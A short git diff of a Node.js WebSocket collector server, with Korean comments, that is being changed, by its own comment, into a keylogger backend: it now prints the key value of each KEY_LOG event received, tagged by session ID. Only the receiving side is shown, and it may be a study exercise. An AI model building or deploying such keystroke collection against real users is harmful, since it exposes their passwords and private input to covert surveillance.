@@ -14,20 +14,23 @@ const MAX_EVENTS = 2000;
 wss.on("connection", (socket) => {  //connection이 발생하면 'socket'이라는 웹소켓 객체 생성
   console.log("[collector] client connected");
 
-  //소켓객체의 콜백함수 예약
-  socket.on("message", (raw) => {   //그리고 생성된 웹소켓 객체인 socket은 "message"데이터를 받으면 'raw'에 일단 저장, 이후에 json으로 정리할꺼임
+  //소켓객체의 콜백함수 예약(키로거로 수정)
+  socket.on("message", (raw) => {
     try {
-      const msg = JSON.parse(raw.toString("utf8"));//raw를 json으로 파싱해서 msg에 저장
-      events.push(msg);//events에 msg를 push
-      if (events.length > MAX_EVENTS) events.shift();//2000개 넘어가면 오래된것 부터 지움
+      const msg = JSON.parse(raw.toString("utf8"));
+      events.push(msg);
+      if (events.length > MAX_EVENTS) events.shift();
 
-      //일단 json이니까 분류는 하는데, 없으면 그냥 기본값으로 공백이나 - 같은걸로 두도록 설정
       const et = msg?.eventType || "UNKNOWN";
       const sid = msg?.sessionId || "-";
-      const c = msg?.counter ?? "";
-      console.log("[collector]", et, sid, c);
+      
+      //KEY_LOG 타입일 때 'key' 값을 출력
+      if (et === "KEY_LOG") {
+        const key = msg?.key || "";
+        console.log(`[collector] ${et} | SID: ${sid.slice(0, 8)} | Key: "${key}"`);
+      }
     } catch {
-      //일단 서버가 죽지 않느게 좋으니까 에러는 못본척 하겠습니다.
+      //일단 에러 무시......
     }
   });
   //마찬가지로 닫힐때 콘솔 찍도록 콜백함수 예약
